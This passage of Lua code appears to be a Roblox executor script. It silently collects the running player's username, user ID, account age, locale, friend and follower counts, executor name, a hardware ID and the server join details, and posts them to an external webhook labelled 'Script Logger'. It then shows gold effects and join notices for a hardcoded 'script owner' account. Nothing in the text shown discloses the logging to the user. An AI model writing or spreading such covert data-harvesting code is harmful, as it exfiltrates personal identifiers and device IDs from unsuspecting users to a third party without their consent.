	-- Game info
	local marketInfo = MarketplaceService:GetProductInfo(placeId)
	local gameName = marketInfo.Name

	-- Server type
	local privateServerId = game.PrivateServerId
	local privateServerOwnerId = game.PrivateServerOwnerId
	local serverType
	if privateServerId == "" then
		serverType = "🌐 Public"
	elseif privateServerOwnerId ~= 0 then
		serverType = "🔒 Private Server (VIP)"
	else
		serverType = "⚙️ Reserved Server"
	end

	-- Position & region

	-- Ping
	local ok, ping = pcall(function()
		return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
	end)
	local pingStr = ok and string.format("%.0f ms", ping) or "N/A"

	-- FPS (frames this second approximation)
	local fpsStr = "N/A"
	pcall(function()
		fpsStr = string.format("%.0f", 1 / Stats.HeartbeatTime) .. " fps"
	end)

	-- Platform
	local platformStr = "Unknown"
	pcall(function()
		local p = UserInputService:GetPlatform()
		local map = {
			[Enum.Platform.Windows] = "Windows",
			[Enum.Platform.OSX] = "macOS",
			[Enum.Platform.Android] = "Android",
			[Enum.Platform.IOS] = "iOS",
			[Enum.Platform.XBoxOne] = "Xbox",
		}
		platformStr = map[p] or tostring(p):gsub("Enum.Platform.", "")
	end)

	-- Keyboard or touch
	local inputType = "Unknown"
	pcall(function()
		if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
			inputType = "Touch"
		elseif UserInputService.KeyboardEnabled then
			inputType = "Keyboard & Mouse"
		elseif UserInputService.GamepadEnabled then
			inputType = "Gamepad"
		end
	end)

	-- Locale / region
	local locale = "Unknown"
	pcall(function()
		locale = LocalizationService.RobloxLocaleId
	end)

	-- Executor
	local executorStr = "Unknown"
	pcall(function()
		if identifyexecutor then
			executorStr = identifyexecutor()
		elseif getexecutorname then
			executorStr = getexecutorname()
		elseif syn then
			executorStr = "Synapse X"
		elseif KRNL_LOADED then
			executorStr = "Krnl"
		elseif fluxus then
			executorStr = "Fluxus"
		end
	end)

	-- HWID
	local hwid = "N/A"
	pcall(function()
		hwid = game:GetService("RbxAnalyticsService"):GetClientId()
	end)

	-- Player count
	local playerCount = #Players:GetPlayers()
	local maxPlayers = Players.MaxPlayers

	-- Account age bucket
	local accountAge = player.AccountAge
	local ageBucket
	if accountAge < 7 then
		ageBucket = "New (<7)"
	elseif accountAge < 365 then
		ageBucket = "Normal"
	else
		ageBucket = "Veteran (1y+)"
	end
	local accountAgeStr = accountAge .. " days (" .. ageBucket .. ")"

	-- Follow/friend counts via API
	local friendCount = "N/A"
	pcall(function()
		local r =
			request({ Url = "https://friends.roblox.com/v1/users/" .. userId .. "/friends/count", Method = "GET" })
		local d = HttpService:JSONDecode(r.Body)
		friendCount = tostring(d.count)
	end)

	-- Membership / premium
	local membershipStr = player.MembershipType == Enum.MembershipType.Premium and "✅ Premium" or "❌ Poor"

	-- Follower count
	local followerCount = "N/A"
	pcall(function()
		local r =
			request({ Url = "https://friends.roblox.com/v1/users/" .. userId .. "/followers/count", Method = "GET" })
		local d = HttpService:JSONDecode(r.Body)
		followerCount = tostring(d.count)
	end)

	-- Display name vs username match
	local nameMatch = player.DisplayName == player.Name and "||Same||" or player.DisplayName

	-- Timestamp
	local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")

	local data = {
		["embeds"] = {
			{
				["author"] = {
					["name"] = gameName,
					["icon_url"] = gameLogoUrl,
				},
				["title"] = "⚡ " .. player.DisplayName .. " executed the script",
				["description"] = "||@" .. player.Name .. "|| just ran the script in **" .. gameName .. "**.",
				["color"] = tonumber(0x5865F2),
				["thumbnail"] = { ["url"] = avatarUrl },
				["timestamp"] = timestamp,
				["fields"] = {
					-- Player identity
					{
						["name"] = "👤 Display Name",
						["value"] = nameMatch,
						["inline"] = true,
					},
					{
						["name"] = "🔖 Username",
						["value"] = "||@" .. player.Name .. "||",
						["inline"] = true,
					},
					{
						["name"] = "🆔 User ID",
						["value"] = tostring(userId),
						["inline"] = true,
					},
					-- Account info
					{
						["name"] = "📅 Account Age",
						["value"] = accountAgeStr,
						["inline"] = true,
					},
					{
						["name"] = "💎 Membership",
						["value"] = membershipStr,
						["inline"] = true,
					},
					{
						["name"] = "🌍 Locale",
						["value"] = locale,
						["inline"] = true,
					},
					-- Social
					{
						["name"] = "👥 Friends",
						["value"] = friendCount,
						["inline"] = true,
					},
					{
						["name"] = "📢 Followers",
						["value"] = followerCount,
						["inline"] = true,
					},
					-- Hardware / system
					{
						["name"] = "🖥️ Platform",
						["value"] = platformStr,
						["inline"] = true,
					},
					{
						["name"] = "🎮 Input",
						["value"] = inputType,
						["inline"] = true,
					},
					{
						["name"] = "⚙️ Executor",
						["value"] = executorStr,
						["inline"] = true,
					},
					{
						["name"] = "🔑 HWID",
						["value"] = "`" .. hwid .. "`",
						["inline"] = false,
					},
					-- Performance
					{
						["name"] = "📶 Ping",
						["value"] = pingStr,
						["inline"] = true,
					},
					{
						["name"] = "🖼️ FPS",
						["value"] = fpsStr,
						["inline"] = true,
					},
					-- Server info
					{
						["name"] = "🎮 Game",
						["value"] = gameName,
						["inline"] = true,
					},
					{
						["name"] = "📌 Place ID",
						["value"] = tostring(placeId),
						["inline"] = true,
					},
					{
						["name"] = "🔒 Server Type",
						["value"] = serverType,
						["inline"] = true,
					},
					{
						["name"] = "👥 Players",
						["value"] = tostring(playerCount) .. " / " .. tostring(maxPlayers),
						["inline"] = true,
					},
					{
						["name"] = "🔁 Job ID",
						["value"] = "`" .. game.JobId .. "`",
						["inline"] = false,
					},
					-- Meta
					{
						["name"] = "🏷️ Version",
						["value"] = "Free",
						["inline"] = true,
					},
					{
						["name"] = "🚀 Join",
						["value"] = "[Click here](https://www.fishstrap.app/v1/joingame?placeId="
							.. placeId
							.. "&gameInstanceId="
							.. game.JobId
							.. ")",
						["inline"] = true,
					},
				},
				["footer"] = {
					["text"] = "Script Logger • " .. gameName,
					["icon_url"] = gameLogoUrl,
				},
			},
		},
	}

	local body = HttpService:JSONEncode(data)
	request({
		Url = webhook_URL,
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = body,
	})
	local TweenService = game:GetService("TweenService")

	local OWNER_NAME = "MrQwenzy1"

	local function createOwnerEffects(player: Player)
		local character = player.Character or player.CharacterAdded:Wait()
		local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
		local head = character:WaitForChild("Head")

		-- Highlight effect
		local highlight = Instance.new("Highlight")
		highlight.FillColor = Color3.fromRGB(255, 215, 0) -- Gold
		highlight.OutlineColor = Color3.fromRGB(255, 140, 0)
		highlight.FillTransparency = 0.4
		highlight.OutlineTransparency = 0
		highlight.Parent = character

		-- "Script Owner" BillboardGui above head
		local billboard = Instance.new("BillboardGui")
		billboard.Size = UDim2.new(0, 160, 0, 40)
		billboard.StudsOffset = Vector3.new(0, 3.5, 0)
		billboard.AlwaysOnTop = false
		billboard.Adornee = head
		billboard.Parent = character

		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, 0, 1, 0)
		label.BackgroundTransparency = 1
		label.Text = "Script Owner (the qwenzy)"
		label.TextColor3 = Color3.fromRGB(255, 215, 0)
		label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
		label.TextStrokeTransparency = 0
		label.Font = Enum.Font.GothamBold
		label.TextScaled = true
		label.Parent = billboard

		-- Pulsing tween on the label text color
		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		TweenService:Create(label, tweenInfo, {
			TextColor3 = Color3.fromRGB(255, 140, 0),
		}):Play()

		-- Particle effect (sparkles)
		local attachment = Instance.new("Attachment")
		attachment.Parent = humanoidRootPart

		local sparkles = Instance.new("Sparkles")
		sparkles.SparkleColor = Color3.fromRGB(255, 215, 0)
		sparkles.Parent = attachment

		local pointLight = Instance.new("PointLight")
		pointLight.Color = Color3.fromRGB(255, 215, 0)
		pointLight.Brightness = 3
		pointLight.Range = 16
		pointLight.Parent = humanoidRootPart

		-- Pulse the light
		TweenService:Create(pointLight, tweenInfo, {
			Brightness = 1,
		}):Play()
	end

	local function showJoinNotification(player: Player)
		-- Notify all players via a ScreenGui
		for _, p in ipairs(Players:GetPlayers()) do
			local playerGui = p:FindFirstChild("PlayerGui")
			if not playerGui then
				continue
			end

			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = "OwnerNotification"
			screenGui.ResetOnSpawn = false
			screenGui.Parent = playerGui

			local frame = Instance.new("Frame")
			frame.Size = UDim2.new(0, 280, 0, 60)
			frame.Position = UDim2.new(0.5, -140, 0, -70) -- starts off screen
			frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
			frame.BackgroundTransparency = 0.2
			frame.BorderSizePixel = 0
			frame.Parent = screenGui

			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0, 10)
			corner.Parent = frame

			local stroke = Instance.new("UIStroke")
			stroke.Color = Color3.fromRGB(255, 215, 0)
			stroke.Thickness = 2
			stroke.Parent = frame

			local text = Instance.new("TextLabel")
			text.Size = UDim2.new(1, 0, 1, 0)
			text.BackgroundTransparency = 1
			text.Text = "👑  Script Owner Joined"
			text.TextColor3 = Color3.fromRGB(255, 215, 0)
			text.Font = Enum.Font.GothamBold
			text.TextSize = 18
			text.Parent = frame

			-- Slide in
			local slideIn =
				TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
					Position = UDim2.new(0.5, -140, 0, 20),
				})
			slideIn:Play()

			-- Slide out after 4 seconds
			task.delay(4, function()
				local slideOut =
					TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
						Position = UDim2.new(0.5, -140, 0, -70),
					})
				slideOut:Play()
				slideOut.Completed:Wait()
				screenGui:Destroy()
			end)
		end
	end

	Players.PlayerAdded:Connect(function(player: Player)
		if player.Name == OWNER_NAME then
			showJoinNotification(player)

			-- Wait for character to load before applying effects
			if player.Character then
				createOwnerEffects(player)
			end
			player.CharacterAdded:Connect(function()
				createOwnerEffects(player)
			end)
		end
	end)

	for i, v in pairs(Players:GetPlayers()) do
		if v.Name == OWNER_NAME then
			showJoinNotification(v)

			-- Wait for character to load before applying effects
			if v.Character then
				createOwnerEffects(v)
			end
			v.CharacterAdded:Connect(function()
				createOwnerEffects(v)
			end)
		end
	end
	print(response)
end)
